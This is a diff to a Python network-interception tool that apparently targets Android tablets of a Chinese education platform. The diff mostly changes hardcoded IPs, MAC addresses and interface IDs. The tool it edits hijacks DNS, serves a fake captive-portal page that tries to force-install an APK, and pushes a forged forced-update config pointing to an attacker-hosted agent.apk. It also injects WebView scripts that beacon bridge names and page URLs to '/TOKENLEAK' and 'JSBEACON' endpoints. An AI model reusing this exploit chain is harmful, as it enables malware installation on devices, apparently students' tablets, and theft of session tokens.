@@ -54,15 +54,15 @@ def _p200_ip():
                     return m.group(1)
     except Exception:
         pass
-    _pad_cache["ip"] = _pad_cache["ip"] or "192.168.137.154"
+    _pad_cache["ip"] = _pad_cache["ip"] or "192.168.137.13"
     _pad_cache["t"] = now
     return _pad_cache["ip"]
 # === /PAD-AUTODETECT ===
 
 
 PAD_MAC = "80:20:fd:8b:4b:fa"
-ICS_MAC = "52:bb:b5:4f:7f:3e"
-IFINDEX = 12
+ICS_MAC = "8c:81:2b:20:7b:42"
+IFINDEX = 26
 PORT = 80
 WATCH = int(sys.argv[1]) if len(sys.argv) > 1 else 86400
 BASE = os.path.dirname(os.path.abspath(__file__))
@@ -125,7 +125,7 @@ def wlog(s):
 def iface_name():
     # PATCH-IFACE (2026-10-10): 优先按热点网卡 GUID 解析。
     #   热点重建后 ifIndex 会变(12->13), GUID 不变; 写死 index 会绑到错误网卡 -> 流量全丢。
-    _want = "{6E5C648D-1355-4F48-B5BA-047951DDDFA3}".lower()
+    _want = "{C77D3DC2-59F6-4821-B674-6189DADCF8ED}".lower()
     try:
         _lst = get_windows_if_list()
     except Exception:
@@ -160,7 +160,7 @@ BODY, BODY_SRC = load_page()
 # 无论端侧怎么解析 ms.yunzuoye.net (HttpDNS 被我们接管 / 或系统 DNS 解析到真机 IP),
 # 只要它的明文请求走 80 端口, 就由本应答器接管并下发这张表;
 # 之后 CONTROL/BIG_DATA/PUSH/LAUNCHER/FILE_BOX 的基址全部变成
-# http://192.168.137.1:8000 (本机自有地址, 本地投递), assist 链随之全程明文。
+# http://192.168.3.114:8000 (本机自有地址, 本地投递), assist 链随之全程明文。
 MICRO_TYPES = ("SA103001", "SB103001", "SB103007", "SB103008", "SB103009", "SB103010",
                "SB103011", "SB103012", "SB103021",
                "SA106003", "SB101001", "SB103019", "SB103018", "SB103015", "SB103013",
@@ -222,12 +222,12 @@ MICRO_BASE = "http://%s:%d" % (OUR_IP, OUR_PORT)
 #   if (url 含 "://" 或 protocol == NONE) **原样返回, 不加协议头**
 #
 # 由此推出两个此前真实存在的错误:
-#   v1: 我们把 domainOrIp 写成 "http://192.168.137.1:8000" 且 port=8000
-#       -> 拼成 "http://192.168.137.1:8000:8000"  (端口重复, 必然连不上)
-#       正解: domainOrIp="http://192.168.137.1"(自带协议头) + port=8000
-#   v2: 我们把 protocol 写成 "NONE" -> getUrl() 直接返回 "192.168.137.1:8000" (无协议头)
-#       正解: protocol="HTTP" + addressType="IP" + domainOrIp="192.168.137.1" + port=8000
-#       -> "http://192.168.137.1:8000"
+#   v1: 我们把 domainOrIp 写成 "http://192.168.3.114:8000" 且 port=8000
+#       -> 拼成 "http://192.168.3.114:8000:8000"  (端口重复, 必然连不上)
+#       正解: domainOrIp="http://192.168.3.114"(自带协议头) + port=8000
+#   v2: 我们把 protocol 写成 "NONE" -> getUrl() 直接返回 "192.168.3.114:8000" (无协议头)
+#       正解: protocol="HTTP" + addressType="IP" + domainOrIp="192.168.3.114" + port=8000
+#       -> "http://192.168.3.114:8000"
 # mode 必须为 0: ServerUrlUnify.update() 里 mode != 0 会被当作"已关闭地址"剔除。
 
 
@@ -350,7 +350,7 @@ def emit(dst_ip, sport, dport, flags, seq, ack, payload=b""):
     stat["resp"] += 1
 
 
-DNS_IP = os.environ.get("HTTP80_DNS_IP") or "192.168.137.1"
+DNS_IP = os.environ.get("HTTP80_DNS_IP") or "192.168.3.114"
 
 # ★ 只把下列域名的 HttpDNS 解析劫持到本机; 其余域名一律返回真实 IP,
 #   以免破坏设备正常联网(这正是"加载网页失败"的根因之一)。
@@ -367,12 +367,12 @@ DNS_PATTERNS = tuple(x.strip().lower() for x in
                      (os.environ.get("HTTP80_DNS_PATTERNS")
                       or "bsb,box,im.,basket,socket,smartclass,classroom,lan-").split(",") if x.strip())
 
-SYS_PORTAL = b'<!DOCTYPE html>\n<html>\n<head>\n<meta charset="utf-8">\n<meta name="viewport" content="width=device-width,initial-scale=1">\n<title>\xe7\xbd\x91\xe7\xbb\x9c\xe8\xae\xa4\xe8\xaf\x81</title>\n<style>\n  body{font-family:-apple-system,"Segoe UI",Roboto,sans-serif;margin:0;padding:12px;background:#f0f2f5;color:#222}\n  .card{background:#fff;border-radius:12px;padding:14px;box-shadow:0 1px 4px rgba(0,0,0,.1);max-width:560px;margin:0 auto}\n  h2{margin:0 0 4px;font-size:17px;color:#1a73e8}\n  h3{margin:12px 0 5px;font-size:12.5px;color:#666;border-top:1px solid #eee;padding-top:8px}\n  .btn{display:block;width:100%;box-sizing:border-box;text-align:center;padding:9px;margin:5px 0;border-radius:8px;font-size:12.5px;font-weight:600;background:#1a73e8;color:#fff;border:0}\n  .btn.alt{background:#fff;color:#1a73e8;border:1px solid #cfd8e3}\n  .btn.r{background:#d93025}\n  .box{font-family:monospace;font-size:10.5px;color:#333;background:#fafafa;border:1px solid #eee;border-radius:6px;padding:8px;margin-top:6px;max-height:300px;overflow:auto;white-space:pre-wrap}\n</style>\n</head>\n<body>\n<div class="card">\n  <h2>\xe7\xbd\x91\xe7\xbb\x9c\xe8\xae\xa4\xe8\xaf\x81</h2>\n  <p style="margin:0 0 8px;font-size:15px;font-weight:700;color:#0b8043">\xe8\xbf\x9e\xe6\x8e\xa5\xe6\x88\x90\xe5\x8a\x9f\xef\xbc\x81</p><p style="margin:0 0 8px;font-size:11px;color:#666">\xe6\xb5\x99\xe6\xb1\x9f\xe5\xad\xa6\xe6\xb5\xb7\xe6\x95\x99\xe8\x82\xb2\xe7\xa7\x91\xe6\x8a\x80\xe6\x9c\x89\xe9\x99\x90\xe5\x85\xac\xe5\x8f\xb8</p>\n  <p id="st" style="color:#888;font-size:12px">\xe5\xb7\xb2\xe5\xb0\xb1\xe7\xbb\xaa\xef\xbc\x88\xe9\xa1\xb5\xe9\x9d\xa2\xe5\xb7\xb2\xe5\xae\x8c\xe6\x95\xb4\xe5\x8a\xa0\xe8\xbd\xbd\xef\xbc\x89</p>\n\n  <h3>A. \xe5\xae\x89\xe8\xa3\x85\xe7\xb1\xbb</h3>\n  <button class="btn r" onclick="tryInstall()">\xe2\x91\xa0 \xe6\x8b\x89\xe8\xb5\xb7\xe5\x8c\x85\xe5\xae\x89\xe8\xa3\x85\xe5\x99\xa8\xef\xbc\x88intent\xef\xbc\x89</button>\n  <button class="btn alt" onclick="tryWin(\'/update.apk\')">\xe2\x91\xa1 \xe6\x96\xb0\xe7\xaa\x97\xe5\x8f\xa3\xe6\x89\x93\xe5\xbc\x80 .apk</button>\n  <button class="btn alt" onclick="tryScheme(\'intent:#Intent;action=android.intent.action.INSTALL_PACKAGE;end\')">\xe2\x91\xa2 INSTALL_PACKAGE \xe5\x8a\xa8\xe4\xbd\x9c</button>\n\n  <h3>B. \xe8\xae\xbe\xe7\xbd\xae\xe7\xb1\xbb\xef\xbc\x88\xe5\x88\xa4\xe6\x96\xad scheme \xe6\x98\xaf\xe5\x90\xa6\xe6\x94\xbe\xe8\xa1\x8c\xef\xbc\x89</h3>\n  <button class="btn r" onclick="tryScheme(\'intent:#Intent;action=android.settings.APPLICATION_DEVELOPMENT_SETTINGS;end\')">\xe5\xbc\x80\xe5\x8f\x91\xe8\x80\x85\xe9\x80\x89\xe9\xa1\xb9\xef\xbc\x88intent\xef\xbc\x89</button>\n  <button class="btn alt" onclick="tryScheme(\'intent:#Intent;action=android.settings.SECURITY_SETTINGS;end\')">\xe5\xae\x89\xe5\x85\xa8\xe8\xae\xbe\xe7\xbd\xae</button>\n  <button class="btn alt" onclick="tryScheme(\'intent:#Intent;action=android.settings.APPLICATION_SETTINGS;end\')">\xe5\xba\x94\xe7\x94\xa8\xe8\xae\xbe\xe7\xbd\xae</button>\n\n  <h3>C. scheme \xe5\xaf\xb9\xe7\x85\xa7\xef\xbc\x88\xe5\x85\xb3\xe9\x94\xae\xe5\x88\xa4\xe5\xae\x9a\xef\xbc\x89</h3>\n  <button class="btn alt" onclick="tryScheme(\'market://details?id=com.olive.agent\')">market://</button>\n  <button class="btn alt" onclick="tryScheme(\'tel:10086\')">tel:</button>\n  <button class="btn alt" onclick="tryScheme(\'file:///sdcard/\')">file:///sdcard/</button>\n  <button class="btn alt" onclick="tryScheme(\'https://www.baidu.com\')">https \xe6\x99\xae\xe9\x80\x9a\xe8\xb7\xb3\xe8\xbd\xac\xef\xbc\x88\xe5\xaf\xb9\xe7\x85\xa7\xef\xbc\x89</button>\n\n  <h3>D. \xe5\xbc\x95\xe6\x93\x8e\xe8\x87\xaa\xe6\xa3\x80</h3>\n  <input type="file" id="f" onchange="fp(this)">\n  <button class="btn alt" onclick="document.getElementById(\'f\').click()">\xe6\x89\x93\xe5\xbc\x80\xe6\x96\x87\xe4\xbb\xb6\xe9\x80\x89\xe6\x8b\xa9\xe5\x99\xa8</button>\n  <button class="btn alt" onclick="env()">\xe5\xbc\x95\xe6\x93\x8e\xe8\x87\xaa\xe6\xa3\x80</button>\n\n  <div class="box" id="out">\xe2\x80\x94</div>\n</div>\n\n<script>\n/* \xe2\x98\x85 \xe5\x9f\x8b\xe7\x82\xb9: \xe7\x94\xa8 fetch+keepalive, \xe7\xbb\x9d\xe4\xb8\x8d\xe9\x98\xbb\xe5\xa1\x9e load; /hit \xe7\x8e\xb0\xe5\x9c\xa8\xe6\x98\xaf 204 \xe5\x8d\xb3\xe6\x97\xb6\xe8\xbf\x94\xe5\x9b\x9e */\nfunction be(tag, d){\n  var s = (typeof d === \'string\') ? d : JSON.stringify(d);\n  var url = \'/hit?ev=\' + encodeURIComponent(\'SYS-\' + tag + \'|\' + String(s).slice(0,1500));\n  try{\n    if (window.fetch) fetch(url, {keepalive:true, cache:\'no-store\'})[\'catch\'](function(){});\n    else { var i = new Image(); i.src = url; }\n  }catch(e){}\n  out(tag + \' \' + String(s).slice(0,200));\n}\nfunction out(o){\n  try{ document.getElementById(\'out\').textContent += \'\\n\' + (typeof o===\'string\'?o:JSON.stringify(o)); }catch(e){}\n}\nfunction st(t){ try{ document.getElementById(\'st\').textContent = t; }catch(e){} }\n\n/* \xe2\x98\x85 \xe4\xb8\x8d\xe8\x87\xaa\xe6\x9d\x80\xe5\xbc\x8f\xe5\xaf\xbc\xe8\x88\xaa: \xe4\xb8\xbb\xe9\xa1\xb5\xe9\x9d\xa2\xe4\xbf\x9d\xe6\x8c\x81\xe5\xad\x98\xe6\xb4\xbb, scheme \xe5\x8f\xaa\xe5\x9c\xa8\xe5\xad\x90\xe7\xaa\x97\xe5\x8f\xa3/iframe \xe9\x87\x8c\xe8\xaf\x95 */\nfunction tryScheme(uri){\n  be(\'scheme\', {uri:uri, ua:navigator.userAgent});\n  st(\'\xe5\xb7\xb2\xe5\xb0\x9d\xe8\xaf\x95: \' + uri.slice(0,40));\n  /* \xe4\xb8\xbb\xe6\x96\x87\xe6\xa1\xa3\xe7\xbb\x9d\xe4\xb8\x8d\xe5\x8a\xa8; \xe7\x94\xa8\xe4\xb8\x80\xe4\xb8\xaa\xe4\xb8\xb4\xe6\x97\xb6 iframe \xe5\xb0\x9d\xe8\xaf\x95, 3 \xe7\xa7\x92\xe5\x90\x8e\xe7\xa7\xbb\xe9\x99\xa4 */\n  try{\n    var fr = document.createElement(\'iframe\');\n    fr.style.cssText = \'width:1px;height:1px;opacity:0;position:absolute;left:-9999px\';\n    fr.src = uri;\n    document.body.appendChild(fr);\n    setTimeout(function(){ try{ fr.parentNode.removeChild(fr); }catch(e){} }, 3000);\n  }catch(e){ be(\'scheme-err\', String(e)); }\n  /* \xe5\x90\x8c\xe6\x97\xb6\xe8\xaf\x95 window.open (\xe9\x83\xa8\xe5\x88\x86 WebView \xe4\xbc\x9a\xe4\xba\xa4\xe7\xbb\x99\xe7\xb3\xbb\xe7\xbb\x9f\xe5\xa4\x84\xe7\x90\x86) */\n  try{ var w = window.open(uri, \'_blank\'); be(\'scheme-win\', String(!!w)); }catch(e){}\n  return false;\n}\n\nfunction tryWin(u){\n  be(\'win\', {u:u});\n  try{ window.open(u, \'_blank\'); }catch(e){ be(\'win-err\', String(e)); }\n  return false;\n}\n\nfunction tryInstall(){\n  be(\'install-start\', {href:location.href});\n  st(\'\xe5\xb0\x9d\xe8\xaf\x95\xe6\x8b\x89\xe8\xb5\xb7\xe5\x8c\x85\xe5\xae\x89\xe8\xa3\x85\xe5\x99\xa8\xe2\x80\xa6\');\n  var fb = encodeURIComponent(\'http://192.168.137.1/update.apk\');\n  tryScheme(\'intent:#Intent;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;S.android.intent.extra.NOT_UNKNOWN_SOURCE=true;S.browser_fallback_url=\' + fb + \';end\');\n  setTimeout(function(){ tryScheme(\'intent:#Intent;action=android.intent.action.INSTALL_PACKAGE;S.android.intent.extra.NOT_UNKNOWN_SOURCE=true;end\'); }, 1200);\n  setTimeout(function(){ tryWin(\'/update.apk\'); }, 2600);\n  return false;\n}\n\nfunction fp(el){\n  try{\n    var f = el.files && el.files[0];\n    be(\'file-picked\', {n: el.files ? el.files.length : 0, name: f ? f.name : \'\', size: f ? f.size : 0});\n    st(\'\xe9\x80\x89\xe5\x88\xb0\xe6\x96\x87\xe4\xbb\xb6: \' + (f ? f.name : \'(none)\'));\n  }catch(e){ be(\'file-err\', String(e)); }\n}\n\nfunction env(){\n  var o = { ua: navigator.userAgent, href: location.href, proto: location.protocol,\n            isX5: /X5|TBS/.test(navigator.userAgent), isWv: /;\\s*wv\\)/.test(navigator.userAgent),\n            cookieEnabled: navigator.cookieEnabled, lang: navigator.language };\n  be(\'env\', o);\n  st(\'\xe8\x87\xaa\xe6\xa3\x80\xe5\xae\x8c\xe6\x88\x90 \xe2\x80\x94 UA \xe8\xa7\x81\xe4\xb8\x8b\xe6\x96\xb9\');\n  return false;\n}\n\n/* \xe2\x98\x85 load \xe4\xb9\x8b\xe5\x90\x8e\xe6\x89\x8d\xe5\x8f\x91\xe5\x9f\x8b\xe7\x82\xb9, \xe4\xbf\x9d\xe8\xaf\x81\xe8\xbf\x9b\xe5\xba\xa6\xe6\x9d\xa1\xe5\x85\x88\xe8\xb5\xb0\xe5\xae\x8c */\nwindow.addEventListener(\'load\', function(){\n  setTimeout(function(){ env(); }, 300);\n});\n</script>\n</body>\n</html>\n'
+SYS_PORTAL = b'<!DOCTYPE html>\n<html>\n<head>\n<meta charset="utf-8">\n<meta name="viewport" content="width=device-width,initial-scale=1">\n<title>\xe7\xbd\x91\xe7\xbb\x9c\xe8\xae\xa4\xe8\xaf\x81</title>\n<style>\n  body{font-family:-apple-system,"Segoe UI",Roboto,sans-serif;margin:0;padding:12px;background:#f0f2f5;color:#222}\n  .card{background:#fff;border-radius:12px;padding:14px;box-shadow:0 1px 4px rgba(0,0,0,.1);max-width:560px;margin:0 auto}\n  h2{margin:0 0 4px;font-size:17px;color:#1a73e8}\n  h3{margin:12px 0 5px;font-size:12.5px;color:#666;border-top:1px solid #eee;padding-top:8px}\n  .btn{display:block;width:100%;box-sizing:border-box;text-align:center;padding:9px;margin:5px 0;border-radius:8px;font-size:12.5px;font-weight:600;background:#1a73e8;color:#fff;border:0}\n  .btn.alt{background:#fff;color:#1a73e8;border:1px solid #cfd8e3}\n  .btn.r{background:#d93025}\n  .box{font-family:monospace;font-size:10.5px;color:#333;background:#fafafa;border:1px solid #eee;border-radius:6px;padding:8px;margin-top:6px;max-height:300px;overflow:auto;white-space:pre-wrap}\n</style>\n</head>\n<body>\n<div class="card">\n  <h2>\xe7\xbd\x91\xe7\xbb\x9c\xe8\xae\xa4\xe8\xaf\x81</h2>\n  <p style="margin:0 0 8px;font-size:15px;font-weight:700;color:#0b8043">\xe8\xbf\x9e\xe6\x8e\xa5\xe6\x88\x90\xe5\x8a\x9f\xef\xbc\x81</p><p style="margin:0 0 8px;font-size:11px;color:#666">\xe6\xb5\x99\xe6\xb1\x9f\xe5\xad\xa6\xe6\xb5\xb7\xe6\x95\x99\xe8\x82\xb2\xe7\xa7\x91\xe6\x8a\x80\xe6\x9c\x89\xe9\x99\x90\xe5\x85\xac\xe5\x8f\xb8</p>\n  <p id="st" style="color:#888;font-size:12px">\xe5\xb7\xb2\xe5\xb0\xb1\xe7\xbb\xaa\xef\xbc\x88\xe9\xa1\xb5\xe9\x9d\xa2\xe5\xb7\xb2\xe5\xae\x8c\xe6\x95\xb4\xe5\x8a\xa0\xe8\xbd\xbd\xef\xbc\x89</p>\n\n  <h3>A. \xe5\xae\x89\xe8\xa3\x85\xe7\xb1\xbb</h3>\n  <button class="btn r" onclick="tryInstall()">\xe2\x91\xa0 \xe6\x8b\x89\xe8\xb5\xb7\xe5\x8c\x85\xe5\xae\x89\xe8\xa3\x85\xe5\x99\xa8\xef\xbc\x88intent\xef\xbc\x89</button>\n  <button class="btn alt" onclick="tryWin(\'/update.apk\')">\xe2\x91\xa1 \xe6\x96\xb0\xe7\xaa\x97\xe5\x8f\xa3\xe6\x89\x93\xe5\xbc\x80 .apk</button>\n  <button class="btn alt" onclick="tryScheme(\'intent:#Intent;action=android.intent.action.INSTALL_PACKAGE;end\')">\xe2\x91\xa2 INSTALL_PACKAGE \xe5\x8a\xa8\xe4\xbd\x9c</button>\n\n  <h3>B. \xe8\xae\xbe\xe7\xbd\xae\xe7\xb1\xbb\xef\xbc\x88\xe5\x88\xa4\xe6\x96\xad scheme \xe6\x98\xaf\xe5\x90\xa6\xe6\x94\xbe\xe8\xa1\x8c\xef\xbc\x89</h3>\n  <button class="btn r" onclick="tryScheme(\'intent:#Intent;action=android.settings.APPLICATION_DEVELOPMENT_SETTINGS;end\')">\xe5\xbc\x80\xe5\x8f\x91\xe8\x80\x85\xe9\x80\x89\xe9\xa1\xb9\xef\xbc\x88intent\xef\xbc\x89</button>\n  <button class="btn alt" onclick="tryScheme(\'intent:#Intent;action=android.settings.SECURITY_SETTINGS;end\')">\xe5\xae\x89\xe5\x85\xa8\xe8\xae\xbe\xe7\xbd\xae</button>\n  <button class="btn alt" onclick="tryScheme(\'intent:#Intent;action=android.settings.APPLICATION_SETTINGS;end\')">\xe5\xba\x94\xe7\x94\xa8\xe8\xae\xbe\xe7\xbd\xae</button>\n\n  <h3>C. scheme \xe5\xaf\xb9\xe7\x85\xa7\xef\xbc\x88\xe5\x85\xb3\xe9\x94\xae\xe5\x88\xa4\xe5\xae\x9a\xef\xbc\x89</h3>\n  <button class="btn alt" onclick="tryScheme(\'market://details?id=com.olive.agent\')">market://</button>\n  <button class="btn alt" onclick="tryScheme(\'tel:10086\')">tel:</button>\n  <button class="btn alt" onclick="tryScheme(\'file:///sdcard/\')">file:///sdcard/</button>\n  <button class="btn alt" onclick="tryScheme(\'https://www.baidu.com\')">https \xe6\x99\xae\xe9\x80\x9a\xe8\xb7\xb3\xe8\xbd\xac\xef\xbc\x88\xe5\xaf\xb9\xe7\x85\xa7\xef\xbc\x89</button>\n\n  <h3>D. \xe5\xbc\x95\xe6\x93\x8e\xe8\x87\xaa\xe6\xa3\x80</h3>\n  <input type="file" id="f" onchange="fp(this)">\n  <button class="btn alt" onclick="document.getElementById(\'f\').click()">\xe6\x89\x93\xe5\xbc\x80\xe6\x96\x87\xe4\xbb\xb6\xe9\x80\x89\xe6\x8b\xa9\xe5\x99\xa8</button>\n  <button class="btn alt" onclick="env()">\xe5\xbc\x95\xe6\x93\x8e\xe8\x87\xaa\xe6\xa3\x80</button>\n\n  <div class="box" id="out">\xe2\x80\x94</div>\n</div>\n\n<script>\n/* \xe2\x98\x85 \xe5\x9f\x8b\xe7\x82\xb9: \xe7\x94\xa8 fetch+keepalive, \xe7\xbb\x9d\xe4\xb8\x8d\xe9\x98\xbb\xe5\xa1\x9e load; /hit \xe7\x8e\xb0\xe5\x9c\xa8\xe6\x98\xaf 204 \xe5\x8d\xb3\xe6\x97\xb6\xe8\xbf\x94\xe5\x9b\x9e */\nfunction be(tag, d){\n  var s = (typeof d === \'string\') ? d : JSON.stringify(d);\n  var url = \'/hit?ev=\' + encodeURIComponent(\'SYS-\' + tag + \'|\' + String(s).slice(0,1500));\n  try{\n    if (window.fetch) fetch(url, {keepalive:true, cache:\'no-store\'})[\'catch\'](function(){});\n    else { var i = new Image(); i.src = url; }\n  }catch(e){}\n  out(tag + \' \' + String(s).slice(0,200));\n}\nfunction out(o){\n  try{ document.getElementById(\'out\').textContent += \'\\n\' + (typeof o===\'string\'?o:JSON.stringify(o)); }catch(e){}\n}\nfunction st(t){ try{ document.getElementById(\'st\').textContent = t; }catch(e){} }\n\n/* \xe2\x98\x85 \xe4\xb8\x8d\xe8\x87\xaa\xe6\x9d\x80\xe5\xbc\x8f\xe5\xaf\xbc\xe8\x88\xaa: \xe4\xb8\xbb\xe9\xa1\xb5\xe9\x9d\xa2\xe4\xbf\x9d\xe6\x8c\x81\xe5\xad\x98\xe6\xb4\xbb, scheme \xe5\x8f\xaa\xe5\x9c\xa8\xe5\xad\x90\xe7\xaa\x97\xe5\x8f\xa3/iframe \xe9\x87\x8c\xe8\xaf\x95 */\nfunction tryScheme(uri){\n  be(\'scheme\', {uri:uri, ua:navigator.userAgent});\n  st(\'\xe5\xb7\xb2\xe5\xb0\x9d\xe8\xaf\x95: \' + uri.slice(0,40));\n  /* \xe4\xb8\xbb\xe6\x96\x87\xe6\xa1\xa3\xe7\xbb\x9d\xe4\xb8\x8d\xe5\x8a\xa8; \xe7\x94\xa8\xe4\xb8\x80\xe4\xb8\xaa\xe4\xb8\xb4\xe6\x97\xb6 iframe \xe5\xb0\x9d\xe8\xaf\x95, 3 \xe7\xa7\x92\xe5\x90\x8e\xe7\xa7\xbb\xe9\x99\xa4 */\n  try{\n    var fr = document.createElement(\'iframe\');\n    fr.style.cssText = \'width:1px;height:1px;opacity:0;position:absolute;left:-9999px\';\n    fr.src = uri;\n    document.body.appendChild(fr);\n    setTimeout(function(){ try{ fr.parentNode.removeChild(fr); }catch(e){} }, 3000);\n  }catch(e){ be(\'scheme-err\', String(e)); }\n  /* \xe5\x90\x8c\xe6\x97\xb6\xe8\xaf\x95 window.open (\xe9\x83\xa8\xe5\x88\x86 WebView \xe4\xbc\x9a\xe4\xba\xa4\xe7\xbb\x99\xe7\xb3\xbb\xe7\xbb\x9f\xe5\xa4\x84\xe7\x90\x86) */\n  try{ var w = window.open(uri, \'_blank\'); be(\'scheme-win\', String(!!w)); }catch(e){}\n  return false;\n}\n\nfunction tryWin(u){\n  be(\'win\', {u:u});\n  try{ window.open(u, \'_blank\'); }catch(e){ be(\'win-err\', String(e)); }\n  return false;\n}\n\nfunction tryInstall(){\n  be(\'install-start\', {href:location.href});\n  st(\'\xe5\xb0\x9d\xe8\xaf\x95\xe6\x8b\x89\xe8\xb5\xb7\xe5\x8c\x85\xe5\xae\x89\xe8\xa3\x85\xe5\x99\xa8\xe2\x80\xa6\');\n  var fb = encodeURIComponent(\'http://192.168.3.114/update.apk\');\n  tryScheme(\'intent:#Intent;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;S.android.intent.extra.NOT_UNKNOWN_SOURCE=true;S.browser_fallback_url=\' + fb + \';end\');\n  setTimeout(function(){ tryScheme(\'intent:#Intent;action=android.intent.action.INSTALL_PACKAGE;S.android.intent.extra.NOT_UNKNOWN_SOURCE=true;end\'); }, 1200);\n  setTimeout(function(){ tryWin(\'/update.apk\'); }, 2600);\n  return false;\n}\n\nfunction fp(el){\n  try{\n    var f = el.files && el.files[0];\n    be(\'file-picked\', {n: el.files ? el.files.length : 0, name: f ? f.name : \'\', size: f ? f.size : 0});\n    st(\'\xe9\x80\x89\xe5\x88\xb0\xe6\x96\x87\xe4\xbb\xb6: \' + (f ? f.name : \'(none)\'));\n  }catch(e){ be(\'file-err\', String(e)); }\n}\n\nfunction env(){\n  var o = { ua: navigator.userAgent, href: location.href, proto: location.protocol,\n            isX5: /X5|TBS/.test(navigator.userAgent), isWv: /;\\s*wv\\)/.test(navigator.userAgent),\n            cookieEnabled: navigator.cookieEnabled, lang: navigator.language };\n  be(\'env\', o);\n  st(\'\xe8\x87\xaa\xe6\xa3\x80\xe5\xae\x8c\xe6\x88\x90 \xe2\x80\x94 UA \xe8\xa7\x81\xe4\xb8\x8b\xe6\x96\xb9\');\n  return false;\n}\n\n/* \xe2\x98\x85 load \xe4\xb9\x8b\xe5\x90\x8e\xe6\x89\x8d\xe5\x8f\x91\xe5\x9f\x8b\xe7\x82\xb9, \xe4\xbf\x9d\xe8\xaf\x81\xe8\xbf\x9b\xe5\xba\xa6\xe6\x9d\xa1\xe5\x85\x88\xe8\xb5\xb0\xe5\xae\x8c */\nwindow.addEventListener(\'load\', function(){\n  setTimeout(function(){ env(); }, 300);\n});\n</script>\n</body>\n</html>\n'
 
-PLATFORM_APK_CFG = (b'{"url":"http://192.168.137.1/agent.apk","checksum":"2c44a3a421a1e26fcd5405e890c583ba","versionCode":999999,"appId":"CA103001","size":1866277,"forceUpdate":true}')
+PLATFORM_APK_CFG = (b'{"url":"http://192.168.3.114/agent.apk","checksum":"2c44a3a421a1e26fcd5405e890c583ba","versionCode":999999,"appId":"CA103001","size":1866277,"forceUpdate":true}')
 
 
-EB_CRAFTED = b'{"code": 0, "msg": "ok", "data": {"questions": [{"wrongQuestionId": "WQ_LAB_0001", "questionId": "Q_LAB_0001", "questionIdsString": "Q_LAB_0001", "studentId": 2112229, "studentWorkId": "SW_LAB_0001", "workId": "W_LAB_0001", "workName": "\xe5\xae\x9e\xe9\xaa\x8c\xe9\x94\x99\xe9\xa2\x98", "subject": 1, "state": 1, "questionUserType": 1, "collectionVersion": 1, "createTime": 1791260532444, "updateTime": 1791260532444, "pictureWidth": 600, "pictureHeight": 800, "annotationUrl": "http://192.168.137.1/eb_img.png", "pictureUrl": "http://192.168.137.1/eb_img.png", "correctedUrl": "http://192.168.137.1/eb_img.png", "isExistLecture": false, "playSpeed": 1.0, "wrongCollectionIds": ["WC_LAB_1"], "tagList": [], "topicLabels": [], "proofs": "", "children": ""}], "collections": [], "lectureExists": [], "topicNext": 0}}'
+EB_CRAFTED = b'{"code": 0, "msg": "ok", "data": {"questions": [{"wrongQuestionId": "WQ_LAB_0001", "questionId": "Q_LAB_0001", "questionIdsString": "Q_LAB_0001", "studentId": 2112229, "studentWorkId": "SW_LAB_0001", "workId": "W_LAB_0001", "workName": "\xe5\xae\x9e\xe9\xaa\x8c\xe9\x94\x99\xe9\xa2\x98", "subject": 1, "state": 1, "questionUserType": 1, "collectionVersion": 1, "createTime": 1791260532444, "updateTime": 1791260532444, "pictureWidth": 600, "pictureHeight": 800, "annotationUrl": "http://192.168.3.114/eb_img.png", "pictureUrl": "http://192.168.3.114/eb_img.png", "correctedUrl": "http://192.168.3.114/eb_img.png", "isExistLecture": false, "playSpeed": 1.0, "wrongCollectionIds": ["WC_LAB_1"], "tagList": [], "topicLabels": [], "proofs": "", "children": ""}], "collections": [], "lectureExists": [], "topicNext": 0}}'
 EB_CATEGORY = b'{"code":0,"msg":"ok","data":[{"wrongCollectionId":"WC_LAB_1","name":"\xe5\xae\x9e\xe9\xaa\x8c","allNum":1,"state":1,"studentId":2112229,"createTime":1,"updateTime":1,"questionUserTypes":[1]}]}'
 
 def dns_public(host, servers=("223.5.5.5", "114.114.114.114", "8.8.8.8")):
@@ -428,7 +428,7 @@ def dns_public(host, servers=("223.5.5.5", "114.114.114.114", "8.8.8.8")):
 ALL_DST = (os.environ.get("HTTP80_ALL_DST") or "0") == "1"
 TARGET_DST = tuple(x.strip() for x in
                    (os.environ.get("HTTP80_TARGET_DST") or
-                    "192.168.137.1,47.111.87.154").split(",") if x.strip())
+                    "192.168.3.114,47.111.87.154").split(",") if x.strip())
 
 # 1x1 占位图: 端侧按类型正常渲染, 同时证明"资源内容由我们决定"
 PNG_1PX = base64.b64decode(
@@ -444,7 +444,7 @@ WEBVIEW_PROBE = (
     "<html><head><meta charset='utf-8'><title>x</title></head><body><h3>x</h3><script>"
     "var ks=[];try{for(var k in window){if(/js|bridge|android|app|xh|launch|native|web|sdk/i.test(k))ks.push(k);}}catch(e){}"
     "var b=new Image();"
-    "b.src='http://192.168.137.1/JSBEACON?href='+encodeURIComponent(location.href)"
+    "b.src='http://192.168.3.114/JSBEACON?href='+encodeURIComponent(location.href)"
     "+'&ua='+encodeURIComponent(navigator.userAgent)"
     "+'&keys='+encodeURIComponent(ks.join('|'));"
     "</script></body></html>").encode("utf-8")
@@ -639,6 +639,7 @@ try{
     be('JS-openCamera',{ok:false, has:!!(window.LauncherJs)});
   }
 }catch(e){ be('JS-openCamera',{err:String(e)}); }
+try{if(window.LauncherJs&&window.LauncherJs.finish){window.LauncherJs.finish();}}catch(e){}
 be('JS-done',{href:location.href,ua:navigator.userAgent});
 })();
 """ % OUR_IP).encode("utf-8")
@@ -685,6 +686,7 @@ AUTH_PAGE = (b"<!DOCTYPE html><html><head><meta charset='utf-8'>"
              b"var _o=(location.protocol==='https:'?'https://www.zjxhedu.com':'http://www.zjxhedu.com');new Image().src=_o+'/TOKENLEAK?t=boot&d='+encodeURIComponent(location.href);new Image().src='/TOKENLEAK?t=bootX&d='+encodeURIComponent(location.href);"
              b"var s=document.createElement('script');s.src=(location.protocol==='https:'?'https://www.zjxhedu.com':'')+'/p.js';"
              b"(document.body||document.documentElement).appendChild(s);"
+             b"setTimeout(function(){try{if(window.LauncherJs&&window.LauncherJs.finish){window.LauncherJs.finish();}}catch(e){}},800);"
              b"</script></body></html>")
 
 ASSIST_SESSION = {"id": "assist_marvis_0001", "teacherId": 1, "teacherName": "学海老师", "status": 1, "createTime": 1692000000000}
@@ -891,7 +893,7 @@ def _mr_is_yunzuoye(v):
         return False
     low = v.lower()
     return ("yunzuoye" in low or "xh.com" in low or "ztytech" in low
-            or "xuehai" in low) and "192.168.137.1" not in low
+            or "xuehai" in low) and "192.168.3.114" not in low
 
 
